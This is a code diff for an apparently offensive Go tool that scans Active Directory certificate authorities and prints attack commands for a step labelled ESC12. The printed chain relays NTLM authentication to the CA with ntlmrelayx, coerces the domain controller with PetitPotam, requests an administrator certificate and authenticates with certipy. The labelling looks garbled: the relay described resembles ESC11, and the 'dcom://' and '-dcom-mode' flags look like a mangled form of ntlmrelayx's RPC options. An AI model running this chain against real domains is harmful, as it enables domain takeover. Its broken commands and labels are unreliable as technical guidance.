@@ -210,6 +210,25 @@ func runEnumerate(cmd *cobra.Command) error {
 		}
 	}
 
+	// ESC12: DCOM interface abuse on CA with network HSM key storage
+	fmt.Println("\n[*] Scanning for ESC12 (DCOM interface abuse on CA)...")
+	esc12Findings, err := pki.ScanESC12(cfg)
+	if err != nil {
+		fmt.Printf("[!] ESC12 scan failed: %v\n", err)
+	} else if len(esc12Findings) == 0 {
+		fmt.Println("[+] ESC12: No CAs with accessible DCOM endpoints found.")
+	} else {
+		fmt.Printf("\n[!] ESC12 VULNERABLE — %d finding(s):\n\n", len(esc12Findings))
+		for _, f := range esc12Findings {
+			fmt.Printf("    CA:        %s\n", f.CAName)
+			fmt.Printf("    Hostname:  %s\n", f.CAHostname)
+			fmt.Printf("    DCOM:      %v\n", f.DCOMAccessible)
+			fmt.Printf("    Flags:     0x%08x\n", f.Flags)
+			fmt.Printf("    Exploit:   certstrike pki --exploit esc12 --template <TEMPLATE> --upn administrator@%s --target-dc %s --domain %s\n", cfg.Domain, cfg.TargetDC, cfg.Domain)
+			fmt.Println()
+		}
+	}
+
 	// ESC9: CT_FLAG_NO_SECURITY_EXTENSION — UPN spoofing via missing requester SID
 	fmt.Println("\n[*] Scanning for ESC9 (CT_FLAG_NO_SECURITY_EXTENSION)...")
 	esc9Findings, err := pki.ScanESC9(cfg)
@@ -472,8 +491,27 @@ func runExploit(cmd *cobra.Command, exploit string) error {
 		fmt.Println("\n[*] After obtaining the certificate via relay:")
 		fmt.Printf("    certipy auth -pfx <cert.pfx> -dc-ip %s\n", cfg.TargetDC)
 		return nil
+	case "esc12":
+		// ESC12 is a DCOM-based attack — scan for accessible DCOM endpoints and print the relay command
+		esc12Findings, scanErr := pki.ScanESC12(cfg)
+		if scanErr != nil {
+			return fmt.Errorf("ESC12 scan failed: %w", scanErr)
+		}
+		if len(esc12Findings) == 0 {
+			return fmt.Errorf("no CAs with accessible DCOM endpoints found")
+		}
+		fmt.Println("\n[!] ESC12 DCOM relay attack — use ntlmrelayx to relay auth to ICertRequest DCOM interface:")
+		for _, f := range esc12Findings {
+			fmt.Printf("\n    Target: %s (%s)\n", f.CAName, f.CAHostname)
+			fmt.Printf("    ntlmrelayx.py -t dcom://%s -dcom-mode ICPR -icpr-ca-name %q -smb2support --template %s\n",
+				f.CAHostname, f.CAName, templateName)
+			fmt.Printf("    # Then coerce auth: PetitPotam.py <LISTENER_IP> %s\n", cfg.TargetDC)
+		}
+		fmt.Println("\n[*] After obtaining the certificate via DCOM relay:")
+		fmt.Printf("    certipy auth -pfx <cert.pfx> -dc-ip %s\n", cfg.TargetDC)
+		return nil
 	default:
-		return fmt.Errorf("unsupported exploit: %s (supported: esc1, esc4, esc8, esc9, esc13)", exploit)
+		return fmt.Errorf("unsupported exploit: %s (supported: esc1, esc4, esc8, esc9, esc12, esc13)", exploit)
 	}
 
 	if err != nil {
@@ -619,7 +657,7 @@ func init() {
 	// Action flags
 	pkiCmd.Flags().Bool("enum", false, "Enumerate ADCS certificate templates")
 	pkiCmd.Flags().Bool("forge", false, "Forge a golden certificate")
-	pkiCmd.Flags().String("exploit", "", "Exploit ESC vulnerability (esc1, esc4, esc8, esc9, esc13)")
+	pkiCmd.Flags().String("exploit", "", "Exploit ESC vulnerability (esc1, esc4, esc8, esc9, esc12, esc13)")
 	pkiCmd.Flags().Bool("auto-detect", false, "Auto-detect ESC vulnerabilities and prioritize attack paths")
 	pkiCmd.Flags().String("import-pfx", "", "Import and display info from a PKCS12/PFX file")
 	pkiCmd.Flags().Bool("report", false, "Generate engagement report from full ADCS enumeration")
